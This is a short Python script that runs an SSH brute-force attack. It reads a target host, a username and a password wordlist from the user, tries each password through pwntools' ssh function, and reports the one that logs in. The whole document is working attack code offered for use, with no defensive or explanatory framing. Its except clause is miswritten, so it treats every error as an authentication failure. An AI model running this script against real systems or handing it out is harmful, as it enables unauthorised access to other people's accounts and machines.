from pwn import *
import paramiko
import sys

host = input("Enter host: ex.127.0.0.1\n ")
username = input("Enter username: ex.hackerman\n ")

# Open file with read permissions
with open(input("Enter filename: ex.passwordList.txt\n ").strip("\n"), "r") as password_list:
  print("\n[*] Starting SSH brute force attack on " + host + " with username " + username)
  for password in password_list:
    password = password.strip("\n") # Stripping password
    try:
      print("\nTrying: {}".format(password))
      response = ssh(host=host, user=username, password=password, timeout=2) # Utilizing ssh function from pwn library
      if response.connected:  # If the connection is successful
        print("[+] Password found: {}".format(password))
        response.close()
        break
      response.close() # Closing if no response
    except:
      paramiko.ssh_exception.AuthenticationException
      print("[X] Authentication Failed: {}".format(password))